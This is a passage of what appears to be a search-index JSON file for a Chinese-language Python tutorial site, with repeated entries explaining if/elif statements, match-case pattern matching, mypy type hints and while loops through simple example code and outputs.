if\u8bed\u53e5\u3002\u7b2c\u4e09\u4e2a\u7b2c\u56db\u4e2a\u7b49\u540e\u9762\u7684\u5c31\u901a\u901a\u4e0d\u6267\u884c\u4e86 \u5c3d\u91cf\u628a\u5339\u914d\u8303\u56f4\u5927\u7684\u89c4\u5219\u5199\u5728\u4e0b\u9762\uff1b \u4f8b\u5982\uff1a 1 \u65e5\u672c\u4eba\u7981\u6b62 2 \u97e9\u56fd\u4eba\u7981\u6b62 3 \u7f8e\u56fd\u4eba\u7981\u6b62 4 \u5916\u56fd\u4eba\u5141\u8bb8 \u4ee5\u4e0a\u89c4\u5219\uff1a\u5148\u5339\u914d \u5c0f\u7684,\u518d\u5339\u914d\u5927\u7684 \u4f8b\u5982\uff1a 1 \u5916\u56fd\u4eba\u7981\u6b62 2 \u65e5\u672c\u4eba\u7981\u6b62 3 \u97e9\u56fd\u4eba\u7981\u6b62 4 \u7f8e\u56fd\u4eba\u7981\u6b62 \u4ee5\u4e0a\u89c4\u5219\uff1a\u5148\u5339\u914d\u5927\u7684\uff0c\u518d\u5339\u914d\u5c0f\u7684\uff0c\u6240\u6709\u5916\u56fd\u4eba\u90fd\u7981\u6b62\u4e86","title":"if\u8bed\u53e5"},{"location":"programming_language/python/basics/if%E8%AF%AD%E5%8F%A5/#if","text":"","title":"if\u8bed\u53e5"},{"location":"programming_language/python/basics/if%E8%AF%AD%E5%8F%A5/#_1","text":"if\u8bed\u53e5\u662f\u6307\u7f16\u7a0b\u8bed\u8a00\u4e2d\u7528\u6765\u5224\u5b9a\u6240\u7ed9\u5b9a\u7684\u6761\u4ef6\u662f\u5426\u6ee1\u8db3\uff0c\u6839\u636e\u5224\u5b9a\u7684\u7ed3\u679c\uff08\u771f\u6216\u5047\uff09\u51b3\u5b9a\u6267\u884c\u7ed9\u51fa\u7684\u4e24\u79cd\u64cd\u4f5c\u4e4b\u4e00 if \u8bed\u53e5\u5305\u542b\u96f6\u4e2a\u6216\u591a\u4e2a [ elif ] \u5b50\u53e5\u53ca\u53ef\u9009\u7684 [ else ] \u5b50\u53e5\u3002\u5173\u952e\u5b57 ' elif ' \u662f 'else if' \u7684\u7f29\u5199\uff0c\u9002\u7528\u4e8e\u907f\u514d\u8fc7\u591a\u7684\u7f29\u8fdb\u3002 if ... elif ... elif ... \u5e8f\u5217\u53ef\u4ee5\u5f53\u4f5c\u5176\u4ed6\u8bed\u8a00\u4e2d switch \u6216 case \u8bed\u53e5\u7684\u66ff\u4ee3\u54c1\u3002","title":"\u5b9a\u4e49"},{"location":"programming_language/python/basics/if%E8%AF%AD%E5%8F%A5/#if_1","text":"x = int(input(\"\u8f93\u5165\u4e00\u4e2a\u6574\u6570: \")) if x < 0: x = 0 print('\u5c0f\u4e8e\u96f6') print('x\u73b0\u5728\u662f'+str(x)) \u8fd0\u884c\u7ed3\u679c\uff1a \u8f93\u5165\u4e00\u4e2a\u6574\u6570: -9 \u5c0f\u4e8e\u96f6 x\u73b0\u5728\u662f0","title":"\u6700\u7b80\u5355\u7684if \u4f8b"},{"location":"programming_language/python/basics/if%E8%AF%AD%E5%8F%A5/#else","text":"x = int(input(\"\u8f93\u5165\u4e00\u4e2a\u6574\u6570: \")) if x < 0: x = 0 print('\u5c0f\u4e8e\u96f6') else: print('\u90fd\u4e0d\u662f') print('x\u73b0\u5728\u662f'+str(x)) \u8fd0\u884c\u7ed3\u679c\uff1a \u8f93\u5165\u4e00\u4e2a\u6574\u6570: -10 \u5c0f\u4e8e\u96f6 x\u73b0\u5728\u662f0","title":"\u5305\u542belse \u4f8b"},{"location":"programming_language/python/basics/if%E8%AF%AD%E5%8F%A5/#elif","text":"\u5982\u679c\u8981\u628a\u4e00\u4e2a\u503c\u4e0e\u591a\u4e2a\u5e38\u91cf\u8fdb\u884c\u6bd4\u8f83\uff0c\u6216\u8005\u68c0\u67e5\u7279\u5b9a\u7c7b\u578b\u6216\u5c5e\u6027\uff0c match \u8bed\u53e5\u66f4\u5b9e\u7528\u3002 x = int(input(\"\u8f93\u5165\u4e00\u4e2a\u6574\u6570: \")) if x < 0: x = 0 print('\u5c0f\u4e8e\u96f6') elif x == 0: print('\u662f\u96f6') elif x == 1: print('\u662f\u4e00') else: print('\u90fd\u4e0d\u662f') print('x\u73b0\u5728\u662f'+str(x)) \u8fd0\u884c\u7ed3\u679c\uff1a \u8f93\u5165\u4e00\u4e2a\u6574\u6570: 1 \u662f\u4e00 x\u73b0\u5728\u662f1","title":"\u5305\u542belif \u4f8b"},{"location":"programming_language/python/basics/if%E8%AF%AD%E5%8F%A5/#_2","text":"if\u8bed\u53e5\u662f\u4f9d\u6b21\u4ece\u4e0a\u5f80\u4e0b\u6267\u884c\uff0c\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u6761\u4ef6\u6ee1\u8db3\u4e86\uff0c\u90a3\u4e48\u4e0b\u9762\u7684\u8bed\u53e5\u5c31\u90fd\u4e0d\u6267\u884c\u4e86\u3002\u4f8b\u5982\u4e0b\u9762\u7684\u6848\u4f8b\uff1a x = int(input(\"\u8f93\u5165\u4e00\u4e2a\u6574\u6570: \")) if x < 0: x = 0 print('\u5c0f\u4e8e\u96f6') elif x > 0: print('\u5927\u4e8e\u96f6') elif x == 0: print('\u662f\u96f6') elif x == 1: print('\u662f\u4e00') else: print('\u90fd\u4e0d\u662f') print('x\u73b0\u5728\u662f'+str(x)) \u7ed3\u679c\uff1a \u8f93\u5165\u4e00\u4e2a\u6574\u6570: 1 \u5927\u4e8e\u96f6 x\u73b0\u5728\u662f1 \u7531\u4e8e1\u5927\u4e8e0\uff0c\u6ee1\u8db3\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u5462\uff0c\u5c31\u6267\u884c\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u4e0b\u9762\u7684\u8bed\u53e5\uff0c\u867d\u7136\u4e5f\u6ee1\u8db3\u7b2c\u56db\u4e2a\u6761\u4ef6\uff0c\u4f46\u662f\u6267\u884c\u5b8c\u7b2c\u4e8c\u4e2a\u5c31\u9000\u51fa\u4e86 if\u8bed\u53e5\u3002\u7b2c\u4e09\u4e2a\u7b2c\u56db\u4e2a\u7b49\u540e\u9762\u7684\u5c31\u901a\u901a\u4e0d\u6267\u884c\u4e86 \u5c3d\u91cf\u628a\u5339\u914d\u8303\u56f4\u5927\u7684\u89c4\u5219\u5199\u5728\u4e0b\u9762\uff1b \u4f8b\u5982\uff1a 1 \u65e5\u672c\u4eba\u7981\u6b62 2 \u97e9\u56fd\u4eba\u7981\u6b62 3 \u7f8e\u56fd\u4eba\u7981\u6b62 4 \u5916\u56fd\u4eba\u5141\u8bb8 \u4ee5\u4e0a\u89c4\u5219\uff1a\u5148\u5339\u914d \u5c0f\u7684,\u518d\u5339\u914d\u5927\u7684 \u4f8b\u5982\uff1a 1 \u5916\u56fd\u4eba\u7981\u6b62 2 \u65e5\u672c\u4eba\u7981\u6b62 3 \u97e9\u56fd\u4eba\u7981\u6b62 4 \u7f8e\u56fd\u4eba\u7981\u6b62 \u4ee5\u4e0a\u89c4\u5219\uff1a\u5148\u5339\u914d\u5927\u7684\uff0c\u518d\u5339\u914d\u5c0f\u7684\uff0c\u6240\u6709\u5916\u56fd\u4eba\u90fd\u7981\u6b62\u4e86","title":"\u6ce8\u610f\u4e8b\u9879"},{"location":"programming_language/python/basics/match%E8%AF%AD%E5%8F%A5/","text":"match\u8bed\u53e5 Switch \u8bed\u53e5\u5b58\u5728\u4e8e\u5f88\u591a\u7f16\u7a0b\u8bed\u8a00\u4e2d\uff0c\u65e9\u5728 2016 \u5e74\uff0cPEP 3103 \u5c31\u88ab\u63d0\u51fa\uff0c\u5efa\u8bae Python \u652f\u6301 switch-case \u8bed\u53e5\u3002 \u65f6\u95f4\u5728\u63a8\u5230 2020 \u5e74\uff0cPython\u7684\u521b\u59cb\u4ebaGuido van Rossum\uff0c\u63d0\u4ea4\u4e86\u663e\u793a switch \u8bed\u53e5\u7684\u7b2c\u4e00\u4e2a\u6587\u6863\uff0c\u547d\u540d\u4e3a Structural Pattern Matching\u3002 \u5982\u4eca\uff0c\u968f\u7740 Python 3.10 beta \u7248\u7684\u53d1\u5e03\uff0c\u7ec8\u4e8e\u5c06 switch-case \u8bed\u53e5\u7eb3\u5165\u5176\u4e2d\u3002 \u5728 Python \u4e2d\uff0c\u8fd9\u4e00\u529f\u80fd\u7531 match \u5173\u952e\u8bcd\u548c case \u8bed\u53e5\u7ec4\u6210\u3002 \u6700\u7b80\u5355\u7684\u4f8b\u5b50 \u4e00\u4e2a\u503c\uff0c\u5373\u4e3b\u8bcd\uff0c\u88ab\u5339\u914d\u5230\u51e0\u4e2a\u5b57\u9762\u503c\uff0c\u5373\u6a21\u5f0f\u3002\u5728\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c status \u662f\u5339\u914d\u8bed\u53e5\u7684\u4e3b\u8bcd\u3002\u6a21\u5f0f\u662f\u6bcf\u4e2a case \u8bed\u53e5\uff0c\u5b57\u9762\u503c\u4ee3\u8868\u8bf7\u6c42\u72b6\u6001\u4ee3\u7801\u3002\u5339\u914d\u540e\uff0c\u5c06\u6267\u884c\u4e0e\u8be5 case \u76f8\u5173\u7684\u52a8\u4f5c def http_error(status): match status: case 400: return \"Bad request\" case 404: return \"Not found\" case 418: return \"I'm a teapot\" case 401 | 403 | 404: return \"Not allowed\" case _: return \"Something's wrong with the internet\" mystr = http_error(500) print(mystr) \u8fd0\u884c\u7ed3\u679c\uff1a Something's wrong with the internet \u76f4\u63a5\u4f7f\u7528 coordinate = (0, 6) match coordinate: case (0, 0): print(\"Origin\") case (0, y): print(f\"Y={y}\") case (x, 0): print(f\"X={x}\") case (x, y): print(f\"X={x}, Y={y}\") case _: raise ValueError(\"Not a coordinate\") \u8fd0\u884c\u7ed3\u679c\uff1a Y=6 \u7c7b\u4e2d\u4f7f\u7528 \u5982\u679c\u4f60\u4f7f\u7528\u7c7b\u6765\u7ed3\u6784\u5316\u4f60\u7684\u6570\u636e\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u7c7b\u7684\u540d\u5b57\uff0c\u540e\u9762\u8ddf\u4e00\u4e2a\u7c7b\u4f3c\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u5217\u8868\uff0c\u4f5c\u4e3a\u4e00\u79cd\u6a21\u5f0f\u3002\u8fd9\u79cd\u6a21\u5f0f\u53ef\u4ee5\u5c06\u7c7b\u7684\u5c5e\u6027\u6355\u6349\u5230\u53d8\u91cf\u4e2d: class Point: def __init__(self, a, b): self.a = a self.b = b def location(point): match point: case Point(a=0, b=0): print(\"Origin is the point's location.\") case Point(a=0, b=b): print(f\"Y={b} and the point is on the y-axis.\") case Point(a=a, b=0): print(f\"a={a} and the point is on the x-axis.\") case Point(): print(\"The point is located somewhere else on the plane.\") case _: print(\"Not a point\") point = Point(0, 1) location(point) \u8fd0\u884c\u7ed3\u679c\uff1a Y=1 and the point is on the y-axis. \u6211\u4eec\u53ef\u4ee5\u5411\u4e00\u4e2a\u6a21\u5f0f\u6dfb\u52a0 if \u5b50\u53e5\uff0c\u79f0\u4e3a\u201c\u7ea6\u675f\u9879\u201d\u3002 \u5982\u679c\u7ea6\u675f\u9879\u4e3a\u5047\u503c\uff0c\u5219 match \u5c06\u7ee7\u7eed\u5c1d\u8bd5\u4e0b\u4e00\u4e2a case \u8bed\u53e5\u5757\u3002 \u8bf7\u6ce8\u610f\u503c\u7684\u6355\u83b7\u53d1\u751f\u5728\u7ea6\u675f\u9879\u88ab\u6c42\u503c\u4e4b\u524d\u3002: class Point: def __init__(self, x, y): self.x = x self.y = y point = Point(x=0, y=0) match point: case Point(x=x, y=y) if x == y: print(f\"The point is located on the diagonal Y=X at {x}.\") case Point(x=x, y=y): print(f\"Point is not on the diagonal.\") \u8fd0\u884c\u7ed3\u679c\uff1a The point is located on the diagonal Y=X at 0. \u4f8b\uff1a from enum import Enum class Color(Enum): RED = 0 GREEN = 1 BLUE = 2 match color: case Color.RED: print(\"I see red!\") case Color.GREEN: print(\"Grass is green\") case Color.BLUE: print(\"I'm feeling the blues :(\") \u8fd0\u884c\u7ed3\u679c\uff1a Enter your choice of 'red', 'blue' or 'green': red I see red! \u590d\u6742\u4e00\u70b9\u7684\u4f8b\u5b50 def func(person): match person: case (name, \"teacher\"): print(f\"{name} is a teacher.\") case (name, _, \"male\"): print(f\"{name} is male.\") case (name, _, \"female\"): print(f\"{name} is female.\") case (name, age, gender): print(f\"{name} is {age} old.\") \u8fd0\u884c\u7ed3\u679c\uff1a Sam is a teacher. John is male. John is female. John is 25 old. \u5b98\u65b9\u6587\u6863\uff1a 4. \u5176\u4ed6\u6d41\u7a0b\u63a7\u5236\u5de5\u5177 \u2014 Python 3.10.7 \u6587\u6863 Python 3.10 \u6709\u4ec0\u4e48\u65b0\u53d8\u5316 \u2014 Python 3.10.7 \u6587\u6863","title":"match\u8bed\u53e5"},{"location":"programming_language/python/basics/match%E8%AF%AD%E5%8F%A5/#match","text":"Switch \u8bed\u53e5\u5b58\u5728\u4e8e\u5f88\u591a\u7f16\u7a0b\u8bed\u8a00\u4e2d\uff0c\u65e9\u5728 2016 \u5e74\uff0cPEP 3103 \u5c31\u88ab\u63d0\u51fa\uff0c\u5efa\u8bae Python \u652f\u6301 switch-case \u8bed\u53e5\u3002 \u65f6\u95f4\u5728\u63a8\u5230 2020 \u5e74\uff0cPython\u7684\u521b\u59cb\u4ebaGuido van Rossum\uff0c\u63d0\u4ea4\u4e86\u663e\u793a switch \u8bed\u53e5\u7684\u7b2c\u4e00\u4e2a\u6587\u6863\uff0c\u547d\u540d\u4e3a Structural Pattern Matching\u3002 \u5982\u4eca\uff0c\u968f\u7740 Python 3.10 beta \u7248\u7684\u53d1\u5e03\uff0c\u7ec8\u4e8e\u5c06 switch-case \u8bed\u53e5\u7eb3\u5165\u5176\u4e2d\u3002 \u5728 Python \u4e2d\uff0c\u8fd9\u4e00\u529f\u80fd\u7531 match \u5173\u952e\u8bcd\u548c case \u8bed\u53e5\u7ec4\u6210\u3002","title":"match\u8bed\u53e5"},{"location":"programming_language/python/basics/match%E8%AF%AD%E5%8F%A5/#_1","text":"\u4e00\u4e2a\u503c\uff0c\u5373\u4e3b\u8bcd\uff0c\u88ab\u5339\u914d\u5230\u51e0\u4e2a\u5b57\u9762\u503c\uff0c\u5373\u6a21\u5f0f\u3002\u5728\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c status \u662f\u5339\u914d\u8bed\u53e5\u7684\u4e3b\u8bcd\u3002\u6a21\u5f0f\u662f\u6bcf\u4e2a case \u8bed\u53e5\uff0c\u5b57\u9762\u503c\u4ee3\u8868\u8bf7\u6c42\u72b6\u6001\u4ee3\u7801\u3002\u5339\u914d\u540e\uff0c\u5c06\u6267\u884c\u4e0e\u8be5 case \u76f8\u5173\u7684\u52a8\u4f5c def http_error(status): match status: case 400: return \"Bad request\" case 404: return \"Not found\" case 418: return \"I'm a teapot\" case 401 | 403 | 404: return \"Not allowed\" case _: return \"Something's wrong with the internet\" mystr = http_error(500) print(mystr) \u8fd0\u884c\u7ed3\u679c\uff1a Something's wrong with the internet \u76f4\u63a5\u4f7f\u7528 coordinate = (0, 6) match coordinate: case (0, 0): print(\"Origin\") case (0, y): print(f\"Y={y}\") case (x, 0): print(f\"X={x}\") case (x, y): print(f\"X={x}, Y={y}\") case _: raise ValueError(\"Not a coordinate\") \u8fd0\u884c\u7ed3\u679c\uff1a Y=6","title":"\u6700\u7b80\u5355\u7684\u4f8b\u5b50"},{"location":"programming_language/python/basics/match%E8%AF%AD%E5%8F%A5/#_2","text":"\u5982\u679c\u4f60\u4f7f\u7528\u7c7b\u6765\u7ed3\u6784\u5316\u4f60\u7684\u6570\u636e\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u7c7b\u7684\u540d\u5b57\uff0c\u540e\u9762\u8ddf\u4e00\u4e2a\u7c7b\u4f3c\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u5217\u8868\uff0c\u4f5c\u4e3a\u4e00\u79cd\u6a21\u5f0f\u3002\u8fd9\u79cd\u6a21\u5f0f\u53ef\u4ee5\u5c06\u7c7b\u7684\u5c5e\u6027\u6355\u6349\u5230\u53d8\u91cf\u4e2d: class Point: def __init__(self, a, b): self.a = a self.b = b def location(point): match point: case Point(a=0, b=0): print(\"Origin is the point's location.\") case Point(a=0, b=b): print(f\"Y={b} and the point is on the y-axis.\") case Point(a=a, b=0): print(f\"a={a} and the point is on the x-axis.\") case Point(): print(\"The point is located somewhere else on the plane.\") case _: print(\"Not a point\") point = Point(0, 1) location(point) \u8fd0\u884c\u7ed3\u679c\uff1a Y=1 and the point is on the y-axis. \u6211\u4eec\u53ef\u4ee5\u5411\u4e00\u4e2a\u6a21\u5f0f\u6dfb\u52a0 if \u5b50\u53e5\uff0c\u79f0\u4e3a\u201c\u7ea6\u675f\u9879\u201d\u3002 \u5982\u679c\u7ea6\u675f\u9879\u4e3a\u5047\u503c\uff0c\u5219 match \u5c06\u7ee7\u7eed\u5c1d\u8bd5\u4e0b\u4e00\u4e2a case \u8bed\u53e5\u5757\u3002 \u8bf7\u6ce8\u610f\u503c\u7684\u6355\u83b7\u53d1\u751f\u5728\u7ea6\u675f\u9879\u88ab\u6c42\u503c\u4e4b\u524d\u3002: class Point: def __init__(self, x, y): self.x = x self.y = y point = Point(x=0, y=0) match point: case Point(x=x, y=y) if x == y: print(f\"The point is located on the diagonal Y=X at {x}.\") case Point(x=x, y=y): print(f\"Point is not on the diagonal.\") \u8fd0\u884c\u7ed3\u679c\uff1a The point is located on the diagonal Y=X at 0. \u4f8b\uff1a from enum import Enum class Color(Enum): RED = 0 GREEN = 1 BLUE = 2 match color: case Color.RED: print(\"I see red!\") case Color.GREEN: print(\"Grass is green\") case Color.BLUE: print(\"I'm feeling the blues :(\") \u8fd0\u884c\u7ed3\u679c\uff1a Enter your choice of 'red', 'blue' or 'green': red I see red!","title":"\u7c7b\u4e2d\u4f7f\u7528"},{"location":"programming_language/python/basics/match%E8%AF%AD%E5%8F%A5/#_3","text":"def func(person): match person: case (name, \"teacher\"): print(f\"{name} is a teacher.\") case (name, _, \"male\"): print(f\"{name} is male.\") case (name, _, \"female\"): print(f\"{name} is female.\") case (name, age, gender): print(f\"{name} is {age} old.\") \u8fd0\u884c\u7ed3\u679c\uff1a Sam is a teacher. John is male. John is female. John is 25 old. \u5b98\u65b9\u6587\u6863\uff1a 4. \u5176\u4ed6\u6d41\u7a0b\u63a7\u5236\u5de5\u5177 \u2014 Python 3.10.7 \u6587\u6863 Python 3.10 \u6709\u4ec0\u4e48\u65b0\u53d8\u5316 \u2014 Python 3.10.7 \u6587\u6863","title":"\u590d\u6742\u4e00\u70b9\u7684\u4f8b\u5b50"},{"location":"programming_language/python/basics/mypy/","text":"Mypy\u662fPython\u7684\u53ef\u9009\u9759\u6001\u7c7b\u578b\u68c0\u67e5\u5668\u3002\u60a8\u53ef\u4ee5\u5728Python\u7a0b\u5e8f\u4e2d\u6dfb\u52a0\u7c7b\u578b\u63d0\u793a\uff08PEP 484\uff09\uff0c\u5e76\u4f7f\u7528mypy\u8fdb\u884c\u9759\u6001\u7c7b\u578b\u68c0\u67e5\u3002\u67e5\u627e\u7a0b\u5e8f\u4e2d\u7684\u9519\u8bef\uff0c\u751a\u81f3\u4e0d\u8fd0\u884c\u5b83\u4eec\uff01 \u5b89\u88c5 pip3 install mypy Test\u7ee7\u627fABC 1. class ABC(object): def prt(self): print(self) print(self.__class__) class Test(ABC): def prt(self): print(self) print(self.__class__) def prc(self): print(\"abc\") g: \"ABC\" = Test() g.prt() \u8fd0\u884c\u7ed3\u679c: (venv) D:\\idea\\flask_learn>mypy learn.py Success: no issues found in 1 source file 2 class ABC(object): def prt(self): print(self) print(self.__class__) class Test(ABC): def prt(self): print(self) print(self.__class__) def prc(self): print(\"abc\") g: \"ABC\" = Test() g.prc() \u8fd0\u884c\u7ed3\u679c\uff1a (venv) D:\\idea\\flask_learn>mypy learn.py learn.py:18: error: \"ABC\" has no attribute \"prc\" Found 1 error in 1 file (checked 1 source file) 3 class Person(object): # \u5b9a\u4e49\u4e00\u4e2a\u7236\u7c7b def talk(self): # \u7236\u7c7b\u4e2d\u7684\u65b9\u6cd5 print(\"person is talking....\") class Chinese(Person): # \u5b9a\u4e49\u4e00\u4e2a\u5b50\u7c7b\uff0c \u7ee7\u627fPerson\u7c7b def walk(self): # \u5728\u5b50\u7c7b\u4e2d\u5b9a\u4e49\u5176\u81ea\u8eab\u7684\u65b9\u6cd5 print('is walking...') g: \"Person\" = Chinese() g.walk() \u8fd0\u884c\u7ed3\u679c\uff1a (venv) D:\\idea\\flask_learn>mypy learn.py learn.py:14: error: \"Person\" has no attribute \"walk\" Found 1 error in 1 file (checked 1 source file) \u5e73\u65f6\u6211\u4eec\u4ee3\u7801\u5927\u6982\u90fd\u662f\u4e0b\u9762\u7684\u6837\u5b50 # \u53c2\u6570name\u7684\u7c7b\u578b\u662f\u672a\u77e5\u7684 # \u8fd4\u56de\u7684\u7c7b\u578b\u4e5f\u662f\u672a\u77e5\u7684 def greeting(name): return 'Hello ' + name \u7a0d\u5fae\u4fee\u6539\u4e00\u4e9b # \u53c2\u6570name\u540e\u9762\u8ddf\u4e86:str \u4ee3\u8868name\u671f\u671b\u662fstr\u7c7b\u578b # \u53c2\u6570\u62ec\u53f7\u540e\u9762\u8ddf\u4e86->str\u4ee3\u8868\u8fd4\u56de\u7c7b\u578b\u4e3astr\u7c7b\u578b def greeting(name: str) -> str: return 'Hello ' + name x: str = 'xxx' # \u58f0\u660e\u4e00\u4e2a\u53d8\u91cf\u4e3astr\u7c7b\u578b greeting(x) # Hello xxx greeting(123) # TypeError: can only concatenate str (not \"int\") to str \u5230\u76ee\u524d\u4e3a\u6b62\u4ec5\u6709str\u3001float\u7b49\u57fa\u672c\u7c7b\u578b\uff0c\u4f7f\u7528list\u3001tuple\u590d\u6742\u7c7b\u578b\u9700\u8981\u5f15\u7528typing\u4e2d\u7684\u7c7b\u578b LIST \u6570\u7ec4\u7c7b\u578b from typing import List # \u53c2\u6570names\u4e3alist\u7c7b\u578b\u5e76\u4e14\u5143\u7d20\u90fd\u662fstr\u7c7b\u578b # \u8fd4\u56de\u4e3aNone def greet_all(names: List[str]) -> None: for name in names: print('Hello ' + name) names = [\"Alice\", \"Bob\", \"Charlie\"] ages = [10, 20, 30] greet_all(names) # Ok! greet_all(ages) #\u51fa\u9519\u4e86 Error due to incompatible types Dict \u5b57\u5178\u7c7b\u578b from typing import Dict # Dict[int, str] int\u4ee3\u8868key\u7c7b\u578b\uff0c str\u4ee3\u8868val\u7c7b\u578b def test(t: Dict[int, str]) -> Dict: return t test({1: '234'}) # {1: '234'} Iterable \u53ef\u4ee5\u8fed\u4ee3\u7c7b\u578b\u5305\u62ec List\u3001Set\u3001Tuple\u3001Str\u3001Dict def greeting(names: Iterable[str]) -> None: for name in names: print(name) greeting(['aaa', 'bbb']) # list aaa bbb greeting(('ccc', 'ddd')) # tuple ccc ddd greeting({'eee', 'fff'}) # set eee fff greeting({'ggg': 'hhh'}) # dict ggg greeting('123') # str 1 2 3 greeting(678) # error: Argument 1 to \"greeting\" has incompatible type \"int\"; expected \"Iterable[str]\" Union \u63a5\u53d7\u591a\u4e2a\u6307\u5b9a\u7c7b\u578b\uff0c\u4f46\u4e0d\u63a5\u53d7\u9664\u6b64\u5916\u7684\u7c7b\u578b from typing import Union # user_id \u53ea\u80fd\u4e3aint\u6216\u8005str def normalize_id(user_id: Union[int, str]) -> str: if isinstance(user_id, int): return 'user-{}'.format(100000 + user_id) else: return user_id normalize_id(1) # user-100001 normalize_id('2') # 2 Optional \u53ef\u9009\u7c7b\u578b\uff0c\u7ed9\u53c2\u6570\u8bbe\u7f6e\u9ed8\u8ba4\u503c from typing import Optional # Optional[str]\u53ea\u662fUnion [str\uff0cNone]\u7684\u7b80\u5199\u6216\u522b\u540d\u3002\u5b83\u4e3b\u8981\u662f\u4e3a\u4e86\u65b9\u4fbf\u5e2e\u52a9\u529f\u80fd\u7b7e\u540d\u770b\u8d77\u6765\u66f4\u6e05\u6d01 # Optional[str, int] \u53ea\u80fd\u5305\u542b\u4e00\u4e2a\u7c7b\u578b, \u8fd9\u6837\u662f\u4e0d\u6b63\u786e\u7684 def greeting(name: Optional[str] = None) -> str: if name is None: name = 'stranger' return 'Hello, ' + name greeting() # Hello, stranger greeting('123') # Hello, 123 Any \u6709\u65f6\u5019\u6211\u4eec\u4e0d\u786e\u5b9a\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u65f6\u5019\u53ef\u4ee5\u7528\u5230Any from typing import Any def greeting(name: Any = None) -> str: if name is None: name = 'stranger' return 'Hello, ' + str(name) greeting() # Hello, stranger greeting('123') # Hello, 123 greeting(234) # Hello, 234 greeting([345]) # Hello, [345] TypeVar \u81ea\u5b9a\u4e49\u7c7b\u578b from typing import TypeVar T = TypeVar('T') # \u4efb\u610f\u7c7b\u578b A = TypeVar('A', int, str) # A\u7c7b\u578b\u53ea\u80fd\u4e3aint\u6216str def test(t: A) -> None: print(t) test(1)","title":"mypy"},{"location":"programming_language/python/basics/mypy/#list","text":"\u6570\u7ec4\u7c7b\u578b from typing import List # \u53c2\u6570names\u4e3alist\u7c7b\u578b\u5e76\u4e14\u5143\u7d20\u90fd\u662fstr\u7c7b\u578b # \u8fd4\u56de\u4e3aNone def greet_all(names: List[str]) -> None: for name in names: print('Hello ' + name) names = [\"Alice\", \"Bob\", \"Charlie\"] ages = [10, 20, 30] greet_all(names) # Ok! greet_all(ages) #\u51fa\u9519\u4e86 Error due to incompatible types","title":"LIST"},{"location":"programming_language/python/basics/mypy/#dict","text":"\u5b57\u5178\u7c7b\u578b from typing import Dict # Dict[int, str] int\u4ee3\u8868key\u7c7b\u578b\uff0c str\u4ee3\u8868val\u7c7b\u578b def test(t: Dict[int, str]) -> Dict: return t test({1: '234'}) # {1: '234'}","title":"Dict"},{"location":"programming_language/python/basics/mypy/#iterable","text":"\u53ef\u4ee5\u8fed\u4ee3\u7c7b\u578b\u5305\u62ec List\u3001Set\u3001Tuple\u3001Str\u3001Dict def greeting(names: Iterable[str]) -> None: for name in names: print(name) greeting(['aaa', 'bbb']) # list aaa bbb greeting(('ccc', 'ddd')) # tuple ccc ddd greeting({'eee', 'fff'}) # set eee fff greeting({'ggg': 'hhh'}) # dict ggg greeting('123') # str 1 2 3 greeting(678) # error: Argument 1 to \"greeting\" has incompatible type \"int\"; expected \"Iterable[str]\"","title":"Iterable"},{"location":"programming_language/python/basics/mypy/#union","text":"\u63a5\u53d7\u591a\u4e2a\u6307\u5b9a\u7c7b\u578b\uff0c\u4f46\u4e0d\u63a5\u53d7\u9664\u6b64\u5916\u7684\u7c7b\u578b from typing import Union # user_id \u53ea\u80fd\u4e3aint\u6216\u8005str def normalize_id(user_id: Union[int, str]) -> str: if isinstance(user_id, int): return 'user-{}'.format(100000 + user_id) else: return user_id normalize_id(1) # user-100001 normalize_id('2') # 2","title":"Union"},{"location":"programming_language/python/basics/mypy/#optional","text":"\u53ef\u9009\u7c7b\u578b\uff0c\u7ed9\u53c2\u6570\u8bbe\u7f6e\u9ed8\u8ba4\u503c from typing import Optional # Optional[str]\u53ea\u662fUnion [str\uff0cNone]\u7684\u7b80\u5199\u6216\u522b\u540d\u3002\u5b83\u4e3b\u8981\u662f\u4e3a\u4e86\u65b9\u4fbf\u5e2e\u52a9\u529f\u80fd\u7b7e\u540d\u770b\u8d77\u6765\u66f4\u6e05\u6d01 # Optional[str, int] \u53ea\u80fd\u5305\u542b\u4e00\u4e2a\u7c7b\u578b, \u8fd9\u6837\u662f\u4e0d\u6b63\u786e\u7684 def greeting(name: Optional[str] = None) -> str: if name is None: name = 'stranger' return 'Hello, ' + name greeting() # Hello, stranger greeting('123') # Hello, 123","title":"Optional"},{"location":"programming_language/python/basics/mypy/#any","text":"\u6709\u65f6\u5019\u6211\u4eec\u4e0d\u786e\u5b9a\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u65f6\u5019\u53ef\u4ee5\u7528\u5230Any from typing import Any def greeting(name: Any = None) -> str: if name is None: name = 'stranger' return 'Hello, ' + str(name) greeting() # Hello, stranger greeting('123') # Hello, 123 greeting(234) # Hello, 234 greeting([345]) # Hello, [345]","title":"Any"},{"location":"programming_language/python/basics/mypy/#typevar","text":"\u81ea\u5b9a\u4e49\u7c7b\u578b from typing import TypeVar T = TypeVar('T') # \u4efb\u610f\u7c7b\u578b A = TypeVar('A', int, str) # A\u7c7b\u578b\u53ea\u80fd\u4e3aint\u6216str def test(t: A) -> None: print(t) test(1)","title":"TypeVar"},{"location":"programming_language/python/basics/while/","text":"\u5faa\u73af \u5faa\u73af\u8bed\u53e5\uff0c\u800c[\u5faa\u73af\u8bed\u53e5]\u7531[\u5faa\u73af\u4f53]\u53ca\u5faa\u73af\u7684\u5224\u5b9a[\u6761\u4ef6]\u4e24\u90e8\u5206\u7ec4\u6210 while_stmt ::= \"while\" assignment_expression \":\" suite [\"else\" \":\" suite] while \u5faa\u73af Python \u4e2d while \u8bed\u53e5\u7684\u4e00\u822c\u5f62\u5f0f\uff1a while \u5224\u65ad\u6761\u4ef6(condition)\uff1a \u6267\u884c\u8bed\u53e5(statements)\u2026\u2026 \u4f8b\uff1a counter = 0 while counter <= 10: counter += 1 print(counter) \u8fd0\u884c\u7ed3\u679c\uff1a 1 2 3 4 5 6 7 8 9 10 11 wile\u6b7b\u5faa\u73af from time import sleep var = 1 while var == 1: # \u8868\u8fbe\u5f0f\u6c38\u8fdc\u4e3a true sleep(1) # \u7761\u4e00\u79d2 